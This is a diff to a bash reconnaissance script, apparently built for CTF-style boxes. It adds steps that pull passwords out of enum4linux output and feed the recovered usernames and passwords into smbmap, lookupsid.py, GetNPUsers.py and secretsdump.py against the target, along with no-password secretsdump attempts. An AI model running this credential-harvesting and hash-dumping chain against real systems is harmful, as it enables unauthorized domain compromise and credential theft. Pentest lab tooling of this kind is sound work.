@@ -347,6 +347,7 @@ run_gobuster(){
 recon_basic(){
 boxe_path=$1
 ip=$2
+wordlist=$7
 # scan for cve with nmap vulners
 if [ -f /usr/share/nmap/scripts/vulners.nse ]; then
   create_node "$boxe_path/nmapvulners" "Nmap_Cves" "recon node name "
@@ -438,7 +439,7 @@ while IFS=: read -r ligne
          continue 
        fi  
        echo "\n${YELLOW}[RECON Http/Https] Running gobuster for the url: $url \n${NC}"
-       run_gobuster $url $common_wordlist "$ligne" "$boxe_path/gobuster" $port
+       run_gobuster $url $wordlist "$ligne" "$boxe_path/gobuster" $port
       fi
 
       # netbios recon
@@ -456,11 +457,19 @@ while IFS=: read -r ligne
         enum4linux -a $ip 2> /dev/null > ${boxe_path}/netbiosrecon/netbiosrecon_${port}.txt
         write_to_page ${boxe_path}/netbiosrecon/page.html ${boxe_path}/netbiosrecon/netbiosrecon_*.txt
         # verify if we found some users
-        enum4linux -U $ip 2> /dev/null > ${boxe_path}/netbiosrecon/enum-users.txt
-        if [ "$(cat ${boxe_path}/netbiosrecon/enum-users.txt | grep 'user:' | cut -d'[' -f 2 | cut -d']' -f 1 )" != "" ]; then
-          cat ${boxe_path}/netbiosrecon/enum-users.txt | grep 'user:' | cut -d'[' -f 2 | cut -d']' -f 1 > ${boxe_path}/netbiosrecon/users.txt
+        enum4linux -U $ip 2> /dev/null > ${boxe_path}/netbiosrecon/enum-users_139.txt
+        if [ "$(cat ${boxe_path}/netbiosrecon/enum-users_139.txt | grep 'user:' | cut -d'[' -f 2 | cut -d']' -f 1 )" != "" ]; then
+          cat ${boxe_path}/netbiosrecon/enum-users_139.txt | grep 'user:' | cut -d'[' -f 2 | cut -d']' -f 1 > ${boxe_path}/netbiosrecon/users.txt
+          if [ "$(cat ${boxe_path}/netbiosrecon/enum-users_139.txt | grep -i 'password set to')" != "" ]; then 
+            for pass in $(cat ${boxe_path}/netbiosrecon/enum-users_139.txt  | grep -i 'password set to' | sed  's/Password set to /&>/' | cut -d'>' -f 2 )
+              do echo "\n${GREEN}[Password] Find password: $pass  \n${NC}"; done
+          fi
+          create_node "$boxe_path/users_enum" "Users_Recon" "recon node name "
+          if [ $? -eq 2 ]; then continue; fi
+          write_to_page ${boxe_path}/users_enum/page.html  ${boxe_path}/netbiosrecon/enum-users_*.txt  
+
         else
-          rm ${boxe_path}/netbiosrecon/enum-users.txt
+          rm ${boxe_path}/netbiosrecon/enum-users_${port}.txt
         fi
       fi  
       # smb recon
@@ -488,6 +497,20 @@ while IFS=: read -r ligne
           if [ "$(cat ${boxe_path}/smbrecon/enum-users.txt | grep 'user:' | cut -d'[' -f 2 | cut -d']' -f 1 )" != "" ]; then
             cat ${boxe_path}/smbrecon/enum-users.txt | grep 'user:' | cut -d'[' -f 2 | cut -d']' -f 1 > ${boxe_path}/smbrecon/users.txt
             for user in $(cat ${boxe_path}/smbrecon/users.txt); do 
+              # If we have any password fro enum4linux
+              if [ "$(cat ${boxe_path}/smbrecon/enum-users.txt | grep -i 'password set to')" != "" ]; then 
+                for pass in $(cat ${boxe_path}/smbrecon/enum-users.txt | grep -i 'password set to' | sed  's/Password set to /&>/' | cut -d'>' -f 2 )
+                 do 
+                   if [ "$(smbmap -u $user -p $pass -H $ip | grep 'Authentication error')" =  "" ]; then
+                     echo "\$ smbmap -u $user -p '$pass' -H $ip "  | tee ${boxe_path}/smbrecon/smbrecon_${port}.txtPass$user
+                     smbmap -u $user -p $pass -H $ip   >>  ${boxe_path}/smbrecon/smbrecon_${port}.txtPass$user
+                   fi
+                   if [ "$(lookupsid.py ${user}:${pass}@${ip}  | grep -i 'error')" =  "" ]; then
+                     echo "\$ lookupsid.py '${user}:${pass}'@${ip}"  >  ${boxe_path}/smbrecon/smbrecon_${port}.txtIPC1$user
+                     lookupsid.py ${user}:${pass}@${ip}    >>  ${boxe_path}/smbrecon/smbrecon_${port}.txtIPC1$user
+                   fi      
+                 done
+              fi
               if [ "$(smbmap -u $user  -H $ip | grep 'Authentication error')" =  "" ]; then
                 echo "\$ smbmap -u $user  -H $ip "  | tee ${boxe_path}/smbrecon/smbrecon_${port}.txt$user
                 smbmap -u $user -H $ip   >>  ${boxe_path}/smbrecon/smbrecon_${port}.txt$user
@@ -536,9 +559,28 @@ while IFS=: read -r ligne
             cat ${boxe_path}/kerberos/enum-users.txt | grep 'user:' | cut -d'[' -f 2 | cut -d']' -f 1 > ${boxe_path}/kerberos/users.txt
             for user in $(cat ${boxe_path}/kerberos/users.txt); do 
               target="${domain}"/$user
+              # If we have any password fro enum4linux
+              if [ "$(cat ${boxe_path}/kerberos/enum-users.txt | grep -i 'password set to')" != "" ]; then 
+                target=$(echo $target)
+                for pass in $(cat ${boxe_path}/kerberos/enum-users.txt  | grep -i 'password set to' | sed  's/Password set to /&>/' | cut -d'>' -f 2 )
+                 do
+                   if [ "$(GetNPUsers.py  -dc-ip $ip $target:$pass | grep 'SessionError')"  = "" ] &&  [ "$(GetNPUsers.py  -dc-ip $ip $target:$pass | grep 'doesn.t have' )"  = "" ]; then
+                     echo "\$ GetNPUsers.py  -dc-ip $ip '$target:$pass' " | tee ${boxe_path}/kerberos/kerberosrecon_${port}.txt$user
+                     GetNPUsers.py  -dc-ip $ip $target:$pass   >> ${boxe_path}/kerberos/kerberosrecon_${port}.txt$user
+                   fi
+                   if [ "$(secretsdump.py   ${target}:$pass@${ip}  | grep -i 'Error' )"  = "" ]; then
+                     echo "\$ secretsdump.py   '${target}:$pass'@${ip}" | tee ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userSEC
+                     secretsdump.py   ${target}:$pass@${ip}   >> ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userSEC
+                   fi
+                 done 
+              fi
               if [ "$(GetNPUsers.py  -dc-ip $ip $target -no-pass | grep 'SessionError')"  = "" ] &&  [ "$(GetNPUsers.py  -dc-ip $ip $target -no-pass | grep 'doesn.t have' )"  = "" ]; then
-                echo "\$ GetNPUsers.py  -dc-ip $ip $target -no-pass" | tee ${boxe_path}/kerberos/kerberosrecon_${port}.txt$user
-                GetNPUsers.py  -dc-ip $ip $target -no-pass   >> ${boxe_path}/kerberos/kerberosrecon_${port}.txt$user
+                echo "\$ GetNPUsers.py  -dc-ip $ip $target -no-pass" | tee ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userGET
+                GetNPUsers.py  -dc-ip $ip $target -no-pass   >> ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userGET
+              fi
+              if [ "$(secretsdump.py   ${target}@${ip} -no-pass | grep -i 'Error' )"  = "" ]; then
+                echo "\$ secretsdump.py  ${target}@${ip} -no-pass" | tee ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userSEC1
+                secretsdump.py   ${target}@${ip} -no-pass   >> ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userSEC1
               fi
             done  
           else
@@ -693,16 +735,16 @@ if [ $? -ne 2 ]; then
   cat <<EOF > $mydir/readme/page.html
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml"><body>
-<span style='font-size: 16pt'><b><span style='color: #ff0000'>Readme of the box '$title' :</span></b></span>
-<span style='font-size: 15pt'><span style='color: #000000'><span style='font-family: Sans'>
+<div style="text-align: center">&nbsp;<span style='font-size: 16pt'><b><span style='color: #ff0000'>Readme of the box '$title' </span></b></span>&nbsp;</div>
+<span style='font-size: 15pt'><span style='color: #000000'><span style='font-family: Sans'><br><br>
 
-</body></html>
+</span></span></body></html>
 EOF
 fi  
 if [ "$lrecon" = "l" ]; then
-  recon_basic $mydir $1 $tcp $udp $ports_tcp $ports_udp
+  recon_basic $mydir $1 $tcp $udp $ports_tcp $ports_udp $common_wordlist
 elif [ "$lrecon" = "h" ]; then
-   recon_huge $mydir $1
+   recon_basic $mydir $1 $tcp $udp $ports_tcp $ports_udp $big_wordlist
 fi
 return 0
 }
